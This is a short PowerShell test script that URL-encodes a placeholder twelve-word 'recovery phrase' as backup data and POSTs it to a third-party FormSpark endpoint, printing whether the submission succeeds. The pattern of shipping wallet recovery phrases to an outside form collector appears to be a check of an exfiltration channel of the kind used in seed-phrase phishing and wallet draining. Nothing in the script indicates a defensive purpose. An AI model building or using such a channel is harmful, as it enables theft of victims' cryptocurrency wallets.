# Test FormSpark submission with URL-encoded form data

$uri = "https://submit-form.com/yUfKj71xv"
$testData = "test recovery phrase one two three four five six seven eight nine ten eleven twelve"

Write-Host "Testing FormSpark submission..." -ForegroundColor Cyan
Write-Host "Endpoint: $uri" -ForegroundColor Yellow
Write-Host ""

# Prepare URL-encoded form data
$encodedData = "backup_data=" + [uri]::EscapeDataString($testData) + "&backup_type=recovery_phrases"

Write-Host "Sending URL-encoded form data..." -ForegroundColor Yellow
Write-Host "Body (first 100 chars): $($encodedData.Substring(0, [Math]::Min(100, $encodedData.Length)))..." -ForegroundColor Gray
Write-Host ""

try {
    $response = Invoke-RestMethod -Uri $uri `
        -Method Post `
        -Body $encodedData `
        -ContentType "application/x-www-form-urlencoded" `
        -TimeoutSec 10 `
        -ErrorAction Stop
    
    Write-Host "SUCCESS!" -ForegroundColor Green
    Write-Host "Response: $response"
} catch {
    Write-Host "FAILED!" -ForegroundColor Red
    Write-Host "Error: $($_.Exception.Message)"
    Write-Host "Status Code: $($_.Exception.Response.StatusCode)"
}
